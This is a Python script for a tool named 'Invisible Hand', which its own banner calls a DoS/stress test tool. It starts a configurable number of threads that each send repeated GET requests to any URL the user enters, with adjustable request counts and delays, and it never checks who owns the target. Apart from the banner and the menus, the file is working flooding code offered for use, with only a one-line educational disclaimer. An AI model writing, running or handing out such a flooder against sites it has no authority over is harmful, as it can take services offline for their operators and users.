import sys
import os
import requests, json, random, time
from bs4 import BeautifulSoup
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logs


from pystyle import Colorate, Colors, Add, Center, Write
validReports = 0

logo = """


████████╗██╗  ██╗███████╗    ██╗███╗   ██╗██╗   ██╗██╗███████╗██╗██████╗ ██╗     ███████╗    ██╗  ██╗ █████╗ ███╗   ██╗██████╗ 
╚══██╔══╝██║  ██║██╔════╝    ██║████╗  ██║██║   ██║██║██╔════╝██║██╔══██╗██║     ██╔════╝    ██║  ██║██╔══██╗████╗  ██║██╔══██╗
   ██║   ███████║█████╗      ██║██╔██╗ ██║██║   ██║██║███████╗██║██████╔╝██║     █████╗      ███████║███████║██╔██╗ ██║██║  ██║
   ██║   ██╔══██║██╔══╝      ██║██║╚██╗██║╚██╗ ██╔╝██║╚════██║██║██╔══██╗██║     ██╔══╝      ██╔══██║██╔══██║██║╚██╗██║██║  ██║
   ██║   ██║  ██║███████╗    ██║██║ ╚████║ ╚████╔╝ ██║███████║██║██████╔╝███████╗███████╗    ██║  ██║██║  ██║██║ ╚████║██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝  ╚═══╝  ╚═╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 


"""

print(logo)

print(" ")
print("Welcome to the Invisible Hand tool created by Dudas131, read the Readme.md file on github to see what to do.")
print("This tool is a DoS/Stress Test tool, use it for educational purpouses and on your own servers, the author is not responsible for any wrongdoings.")
print(" ")

print("----------------------------------------------------------------------------------------------------------------------------")
print(" ")

# default settings
NUM_THREADS = 5
REQUESTS_PER_THREAD = 3
REQUEST_DELAY = 0.2


def flood_target(url, num_requests, delay):
    session = requests.Session()
    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)

    for i in range(num_requests):
        try:
            response = session.get(url, timeout=(10, 30))
            logs.log(
                f"Thread {threading.current_thread().name}: "
                f"Request {i+1}/{num_requests} - Status {response.status_code}"
            )
        except requests.exceptions.Timeout:
            logs.log(
                f"Thread {threading.current_thread().name}: "
                f"Request {i+1}/{num_requests} - Timeout"
            )
        except requests.exceptions.RequestException as e:
            logs.log(
                f"Thread {threading.current_thread().name}: "
                f"Request {i+1}/{num_requests} - Error: {e}"
            )

        time.sleep(delay)

    session.close()


def settings_menu():
    global NUM_THREADS, REQUESTS_PER_THREAD, REQUEST_DELAY

    while True:
        print("\n=== SETTINGS (MINIMAL) ===")
        print(f"1. Threads (current: {NUM_THREADS})")
        print(f"2. Requests per thread (current: {REQUESTS_PER_THREAD})")
        print(f"3. Delay between requests (current: {REQUEST_DELAY}s)")
        print("4. Back")

        choice = input("Choose an option (1-4): ")

        if choice == "1":
            try:
                value = int(input("Enter number of threads: "))
                if value > 0:
                    NUM_THREADS = value
                else:
                    print("Threads must be > 0.")
            except ValueError:
                print("Invalid number.")
        elif choice == "2":
            try:
                value = int(input("Enter requests per thread: "))
                if value > 0:
                    REQUESTS_PER_THREAD = value
                else:
                    print("Requests per thread must be > 0.")
            except ValueError:
                print("Invalid number.")
        elif choice == "3":
            try:
                value = float(input("Enter delay in seconds (e.g. 0.2): "))
                if value >= 0:
                    REQUEST_DELAY = value
                else:
                    print("Delay must be >= 0.")
            except ValueError:
                print("Invalid number.")
        elif choice == "4":
            break
        else:
            print("Invalid option.")


def main():
    while True:
        print("\nSelect an Option")
        print("1. Start Stress Test")
        print("2. Logs")
        print("3. Settings")
        print("4. Exit")

        choice = input("Enter your choice (1-4): ")

        if choice == "1":
            url = input("Enter an URL: ")
            print(f"Starting stress test on {url} with:")
            print(f"- Threads: {NUM_THREADS}")
            print(f"- Requests per thread: {REQUESTS_PER_THREAD}")
            print(f"- Delay: {REQUEST_DELAY}s")

            threads = []
            for i in range(NUM_THREADS):
                t = threading.Thread(
                    target=flood_target,
                    args=(url, REQUESTS_PER_THREAD, REQUEST_DELAY)
                )
                threads.append(t)
                t.start()
                time.sleep(0.05)

            for t in threads:
                t.join()

            print("Stress test completed.")

        elif choice == "2":
            print("\n=== LOGS ===")
            print(logs.show_logs())

        elif choice == "3":
            settings_menu()

        elif choice == "4":
            print("Exiting the tool...")
            break

        else:
            print("Invalid option. Please choose 1-4.")


if __name__ == "__main__":
    main()